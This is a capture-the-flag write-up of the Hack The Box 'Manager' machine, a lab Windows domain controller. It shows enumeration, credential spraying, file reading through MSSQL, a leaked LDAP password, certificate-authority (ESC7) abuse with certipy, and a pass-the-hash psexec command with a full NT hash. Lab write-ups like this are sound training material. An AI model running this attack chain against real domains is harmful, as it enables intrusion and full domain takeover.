![manager.png](manager.png)

# Manager

## Enum

```bash
nmap -sC -sV -Pn 10.10.11.236 -oN scans/nmap.initial
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 11:50 GMT
Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 84.62% done; ETC: 11:51 (0:00:02 remaining)
Nmap scan report for 10.10.11.236
Host is up (0.032s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Manager
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-29 18:51:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-29T18:52:30+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-29T18:52:31+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-10-29T18:14:32
|_Not valid after:  2053-10-29T18:14:32
|_ssl-date: 2023-10-29T18:52:30+00:00; +7h00m01s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-10-29T18:52:30+00:00; +7h00m01s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-29T18:52:31+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-10-29T18:51:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.80 seconds
```
```bash
curl -I 10.10.11.236
HTTP/1.1 200 OK
Content-Length: 18203
Content-Type: text/html
Last-Modified: Thu, 27 Jul 2023 16:02:39 GMT
Accept-Ranges: bytes
ETag: "1c67a5c4a3c0d91:0"
Server: Microsoft-IIS/10.0
Date: Sun, 29 Oct 2023 18:55:00 GMT
```

## SMB enum

```bash
smbmap -H 10.10.11.236
[+] IP: 10.10.11.236:445        Name: unknown
```
```bash
smbmap -H 10.10.11.236 -u null -p null
[+] Guest session       IP: 10.10.11.236:445    Name: unknown                                   
[!] Error:  (<class 'impacket.smbconnection.SessionError'>, 'smbmap', 1337)
```
```bash
smbmap -H 10.10.11.236 -u guest
[+] IP: 10.10.11.236:445        Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        SYSVOL                                                  NO ACCESS       Logon server share
```
```bash
smbclient -U guest --password "" //10.10.11.236/IPC$
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \>
```

## DNS Enum

```bash
dig ANY @10.10.11.236 manager.htb

; <<>> DiG 9.18.19 <<>> ANY @10.10.11.236 manager.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 37188
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;manager.htb.                   IN      ANY

;; ANSWER SECTION:
manager.htb.            600     IN      A       10.10.11.236
manager.htb.            3600    IN      NS      dc01.manager.htb.
manager.htb.            3600    IN      SOA     dc01.manager.htb. hostmaster.manager.htb. 251 900 600 86400 3600

;; ADDITIONAL SECTION:
dc01.manager.htb.       1200    IN      A       10.10.11.236

;; Query time: 26 msec
;; SERVER: 10.10.11.236#53(10.10.11.236) (TCP)
;; WHEN: Sun Oct 29 12:17:41 GMT 2023
;; MSG SIZE  rcvd: 138
```

## Subdomains enum

Found nothing but it seems logical as we already have all the domains and subdomains from the DNS server
```bash
ffuf \
  -c \
  -w /usr/share/seclists-git/Discovery/DNS/subdomains-top1million-5000.txt \
  -u "http://manager.htb" \
  -H "Host: FUZZ.manager.htb" \
  -fs 18203
```

## Kerberos enum

Enumerating users with kerbrute
```bash
kerbrute userenum \
    -d manager.htb \
    --dc manager.htb \
    /usr/share/seclists-git/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 10/29/23 - Ronnie Flathers @ropnop

2023/10/29 12:34:25 >  Using KDC(s):
2023/10/29 12:34:25 >   manager.htb:88

2023/10/29 12:34:26 >  [+] VALID USERNAME:       ryan@manager.htb
2023/10/29 12:34:27 >  [+] VALID USERNAME:       guest@manager.htb
2023/10/29 12:34:28 >  [+] VALID USERNAME:       cheng@manager.htb
2023/10/29 12:34:28 >  [+] VALID USERNAME:       raven@manager.htb
2023/10/29 12:34:31 >  [+] VALID USERNAME:       administrator@manager.htb
2023/10/29 12:34:37 >  [+] VALID USERNAME:       Ryan@manager.htb
2023/10/29 12:34:38 >  [+] VALID USERNAME:       Raven@manager.htb
2023/10/29 12:34:41 >  [+] VALID USERNAME:       operator@manager.htb
2023/10/29 12:35:09 >  [+] VALID USERNAME:       Guest@manager.htb
2023/10/29 12:35:10 >  [+] VALID USERNAME:       Administrator@manager.htb
2023/10/29 12:35:31 >  [+] VALID USERNAME:       Cheng@manager.htb
2023/10/29 12:36:38 >  [+] VALID USERNAME:       jinwoo@manager.htb
2023/10/29 12:36:51 >  [+] VALID USERNAME:       RYAN@manager.htb
2023/10/29 12:37:30 >  [+] VALID USERNAME:       RAVEN@manager.htb
2023/10/29 12:37:32 >  [+] VALID USERNAME:       GUEST@manager.htb
2023/10/29 12:38:34 >  [+] VALID USERNAME:       Operator@manager.htb
2023/10/29 12:45:24 >  [+] VALID USERNAME:       OPERATOR@manager.htb
```

```
cat users.txt
ryan
guest
cheng
raven
administrator
Ryan
Raven
operator
Guest
Administrator
Cheng
jinwoo
RYAN
RAVEN
GUEST
Operator
OPERATOR
```

Python kerbrute
```bash
python3 ./kerbrute.py \
    -users ~/sec/htb/machines/manager/tools/users.txt \
    -passwords /usr/share/seclists-git/Passwords/xato-net-10-million-passwords-10.txt \
    -domain manager.htb
```
```bash
python3 ./kerbrute.py \
    -users ~/sec/htb/machines/manager/tools/users.txt \
    -passwords /usr/share/seclists-git/Passwords/xato-net-10-million-passwords-10.txt \
    -domain manager.htb
```
Kerberos bruteforce with metasploit
```bash
msf6 > use auxiliary/gather/kerberos_enumusers
msf6 auxiliary(gather/kerberos_enumusers) > set PASS_FILE /usr/share/seclists-git/Passwords/xato-net-10-million-passwords-1000.txt
PASS_FILE => /usr/share/seclists-git/Passwords/xato-net-10-million-passwords-1000.txt
msf6 auxiliary(gather/kerberos_enumusers) > set DOMAIN manager.htb
DOMAIN => manager.htb
msf6 auxiliary(gather/kerberos_enumusers) > set RHOSTS 10.10.11.236
msf6 auxiliary(gather/kerberos_enumusers) > set USER_FILE ~/sec/htb/machines/manager/tools/users.txt                                                                                            
USER_FILE => ~/sec/htb/machines/manager/tools/users.txt
msf6 auxiliary(gather/kerberos_enumusers) > exploit
```

Finally we find something with smb, operator also has a password of operator
```bash
crackmapexec smb 10.10.11.236 -u ~/sec/htb/machines/manager/tools/users.txt -p ~/sec/htb/machines/manager/tools/users.txt --no-brute
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\Ryan:Ryan STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\Raven:Raven STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
```
```bash
smbmap -H 10.10.11.236 -u operator -p operator
[+] IP: 10.10.11.236:445        Name: dc01.manager.htb
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
```
```bash
smbclient -U operator --password operator //10.10.11.236/SYSVOL
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
```bash
tree .
.
|-- DfsrPrivate
|-- Policies
|   |-- {31B2F340-016D-11D2-945F-00C04FB984F9}
|   |   |-- GPT.INI
|   |   |-- MACHINE
|   |   |   |-- Microsoft
|   |   |   |   `-- Windows\ NT
|   |   |   |       `-- SecEdit
|   |   |   |           `-- GptTmpl.inf
|   |   |   |-- Registry.pol
|   |   |   `-- Scripts
|   |   |       |-- Shutdown
|   |   |       `-- Startup
|   |   `-- USER
|   `-- {6AC1786C-016F-11D2-945F-00C04fB984F9}
|       |-- GPT.INI
|       |-- MACHINE
|       |   `-- Microsoft
|       |       `-- Windows\ NT
|       |           `-- SecEdit
|       |               `-- GptTmpl.inf
|       `-- USER
`-- scripts

19 directories, 5 files
```

This is also a valid combo to connect to the mssql server 
```bash
cme mssql 10.10.11.236 -u ~/sec/htb/machines/manager/tools/users.txt -p ~/sec/htb/machines/manager/tools/users.txt --no-brute
MSSQL       10.10.11.236    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       10.10.11.236    1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator
```

We connect with impacket, and use `xp_dirtree` to navigate the filesystem
```bash
mssqlclient.py -dc-ip 10.10.11.236 manager.htb/operator:operator@10.10.11.236 -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)>
```

## File read with xp_dirtree and credential exposure

We find a website-backup in the web root of the site
```bash
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot\
subdirectory                      depth   file
-------------------------------   -----   ----
about.html                            1      1

contact.html                          1      1

css                                   1      0

images                                1      0

index.html                            1      1

js                                    1      0

service.html                          1      1

web.config                            1      1

website-backup-27-07-23-old.zip       1      1
```

Downloading that locally to extract it
```bash
curl -O http://manager.htb/website-backup-27-07-23-old.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 1020k  100 1020k    0     0  2152k      0 --:--:-- --:--:-- --:--:-- 2149k
```
```bash
tree -a .
.
|-- .old-conf.xml
|-- about.html
|-- contact.html
|-- css
|   |-- bootstrap.css
|   |-- responsive.css
|   |-- style.css
|   |-- style.css.map
|   `-- style.scss
|-- images
|   |-- about-img.png
|   |-- body_bg.jpg
|   |-- call-o.png
|   |-- call.png
|   |-- client.jpg
|   |-- contact-img.jpg
|   |-- envelope-o.png
|   |-- envelope.png
|   |-- hero-bg.jpg
|   |-- location-o.png
|   |-- location.png
|   |-- logo.png
|   |-- menu.png
|   |-- next-white.png
|   |-- next.png
|   |-- offer-img.jpg
|   |-- prev-white.png
|   |-- prev.png
|   |-- quote.png
|   |-- s-1.png
|   |-- s-2.png
|   |-- s-3.png
|   |-- s-4.png
|   `-- search-icon.png
|-- index.html
|-- js
|   |-- bootstrap.js
|   `-- jquery-3.4.1.min.js
`-- service.html

4 directories, 36 files
```

Checking .old-conf.xml it has credentials for raven
```xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R*********************</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

We we can leverage to win-rm into the box as raven
```bash
docker run --rm -it --name evil-winrm oscarakaelvis/evil-winrm -i 10.10.11.236 -u raven -p 'R*********************'

Unable to find image 'oscarakaelvis/evil-winrm:latest' locally
latest: Pulling from oscarakaelvis/evil-winrm
f7dab3ab2d6e: Pull complete
7050028d4067: Pull complete
416f20fa5395: Pull complete
6710d069602c: Pull complete
6d54f2051925: Pull complete
7a45fafc3da8: Pull complete
4f4fb700ef54: Pull complete
Digest: sha256:cc95310177840ffe5ded33de7e83f28e0685146f3100caa5cb0b79f8dd80b104
Status: Downloaded newer image for oscarakaelvis/evil-winrm:latest

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
```

## Privesc through the certificate authority

As raven we can find certificate templates
```bash
certipy find -u raven@manager.htb -p 'R*********************' -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Saved BloodHound data to '20231029145119_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231029145119_Certipy.txt'
[*] Saved JSON output to '20231029145119_Certipy.json'
```

Adding raven as a ca officer
```bash
certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R*********************' -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

Enable the vulnerable template SubCA 
```bash
certipy ca -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R*********************' -dc-ip 10.10.11.236 -enable-template 'SubCA'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

Use that template to create a cert as administrator
```bash
certipy req -username raven@manager.htb -password 'R*********************' -ca 'manager-DC01-CA' -target 10.10.11.236 -template SubCA -upn administrator@manager.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 20
Would you like to save the private key? (y/N) y
[*] Saved private key to 20.key
[-] Failed to request certificate
```

This fails as expected but we can now use the key to request the certificate again
```bash
certipy ca -ca 'manager-DC01-CA' -issue-request 20 -username raven@manager.htb -password 'R*********************'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

And finally save it locally
```bash
certipy req -username raven@manager.htb -password 'R*********************' -ca 'manager-DC01-CA' -target 10.10.11.236 -retrieve 20
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 20
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '20.key'
[*] Saved certificate and private key to 'administrator.pfx'
```


If we attempt to get authenticate with that cert we might get a clock skew error, as our machine's time isn't the same as the time on the DC.  
Disable ntp and sync with the time of the DC.
```bash
sudo timedatectl set-ntp false
sudo ntpdate manager.htb
```

Authenticate
```bash
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'manager.htb' -dc-ip 10.10.11.236
```

We get a hash that we can use with psexec (pass the hash) and we're administrator
```bash
python3 psexec.py manager.htb/administrator@manager.htb -hashes 'aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef' -dc-ip 10.10.11.236
```
